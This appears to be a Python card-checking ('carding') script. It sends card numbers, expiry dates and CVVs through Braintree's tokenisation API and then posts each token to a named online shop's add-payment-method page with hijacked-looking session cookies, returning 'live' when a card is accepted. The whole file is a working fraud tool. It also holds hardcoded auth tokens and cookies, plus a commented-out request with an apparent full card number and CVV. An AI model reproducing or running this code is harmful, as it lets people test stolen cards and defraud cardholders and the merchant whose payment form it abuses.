import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTk1ODE4NzksImp0aSI6IjUwZjA1NzA3LTM3MDktNDE2NC05M2M1LWFlYTQ2MDZhYWQwNyIsInN1YiI6ImpzYnFoNzdoYjNqMzVtd20iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImpzYnFoNzdoYjNqMzVtd20iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.5NfxMGJ9-25kkxsB7QVirbBV7mkyWDCQHLfJfyNjLlzilET3nXhEHH9vymcBqYHyb4y_XSHy_eQkZDwmnV0BA',
	    'braintree-version': '2018-05-10',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'pragma': 'no-cache',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'bdaf9471-d28d-4e54-baf4-ca04499c659d',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	import requests
	
	cookies = {
	    'apbct_site_referer': 'UNKNOWN',
	    'ct_sfw_pass_key': 'b3c58cfad56dcdd101259f89084ff3a60',
	    'wordpress_logged_in_b11649193abc24c881cdab50e9bfa64c': 'visaspam77%7C1700700611%7CmrDVJu6TkzdkR8dfytPYLmZpM3RSaN536XDVVHgHRyD%7C37a8f94ac8e28be68ba551cf8ae84be4634b48b86cc30ad02e1003eddc95d22a',
	    'wfwaf-authcookie-ea7f28c23ebbc0b6e3296f9d33b62020': '45%7Cother%7Cread%7C6270f2ccf8b2e6f361ee14e9f389db2cb850dfc89b66d70a99954d589dd0264a',
	    'apbct_site_landing_ts': '1699495928',
	    'apbct_prev_referer': 'https%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F',
	    'ct_ps_timestamp': '1699495930',
	    'ct_timezone': '2',
	    'ct_screen_info': '%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A1297%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D',
	    'apbct_headless': 'false',
	    'ct_checked_emails': '0',
	    'ct_checkjs': '1865683398',
	    'ct_has_scrolled': 'true',
	    'apbct_timestamp': '1699495940',
	    'apbct_page_hits': '3',
	    'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%252262d4cbbc5554565c51cf0b43578a215a%2522%257D',
	    'apbct_urls': '%7B%22www.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1699491015%2C1699491110%2C1699495473%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%22%3A%5B1699491134%2C1699495477%2C1699495496%2C1699495928%2C1699495938%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2F%22%3A%5B1699491076%2C1699491103%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2Fbilling%2F%22%3A%5B1699491084%5D%2C%22www.blackorchidcouture.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framewor%22%3A%5B1699495484%2C1699495502%2C1699495940%5D%7D',
	    'ct_mouse_moved': 'true',
	    'ct_fkp_timestamp': '1699495949',
	    'ct_pointer_data': '%5B%5B180%2C286%2C19223%5D%2C%5B410%2C198%2C20893%5D%5D',
	}
	
	headers = {
	    'authority': 'www.blackorchidcouture.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'apbct_site_referer=UNKNOWN; ct_sfw_pass_key=b3c58cfad56dcdd101259f89084ff3a60; wordpress_logged_in_b11649193abc24c881cdab50e9bfa64c=visaspam77%7C1700700611%7CmrDVJu6TkzdkR8dfytPYLmZpM3RSaN536XDVVHgHRyD%7C37a8f94ac8e28be68ba551cf8ae84be4634b48b86cc30ad02e1003eddc95d22a; wfwaf-authcookie-ea7f28c23ebbc0b6e3296f9d33b62020=45%7Cother%7Cread%7C6270f2ccf8b2e6f361ee14e9f389db2cb850dfc89b66d70a99954d589dd0264a; apbct_site_landing_ts=1699495928; apbct_prev_referer=https%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F; ct_ps_timestamp=1699495930; ct_timezone=2; ct_screen_info=%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A1297%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D; apbct_headless=false; ct_checked_emails=0; ct_checkjs=1865683398; ct_has_scrolled=true; apbct_timestamp=1699495940; apbct_page_hits=3; apbct_cookies_test=%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%252262d4cbbc5554565c51cf0b43578a215a%2522%257D; apbct_urls=%7B%22www.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1699491015%2C1699491110%2C1699495473%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%22%3A%5B1699491134%2C1699495477%2C1699495496%2C1699495928%2C1699495938%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2F%22%3A%5B1699491076%2C1699491103%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2Fbilling%2F%22%3A%5B1699491084%5D%2C%22www.blackorchidcouture.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framewor%22%3A%5B1699495484%2C1699495502%2C1699495940%5D%7D; ct_mouse_moved=true; ct_fkp_timestamp=1699495949; ct_pointer_data=%5B%5B180%2C286%2C19223%5D%2C%5B410%2C198%2C20893%5D%5D',
	    'origin': 'https://www.blackorchidcouture.com',
	    'pragma': 'no-cache',
	    'referer': 'https://www.blackorchidcouture.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'visa',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	    'wc_braintree_credit_card_payment_nonce': tok,
	    'wc_braintree_device_data': '{"correlation_id":"9da5d244ed51001b9886001e45f4591d"}',
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'woocommerce-add-payment-method-nonce': 'fa5ecc42b6',
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxMH19',
	}
	
	response = requests.post(
	    'https://www.blackorchidcouture.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"bdaf9471-d28d-4e54-baf4-ca04499c659d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4174010099391014","expirationMonth":"08","expirationYear":"2025","cvv":"888"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	text=(response.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text:
			return 'live'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'
	
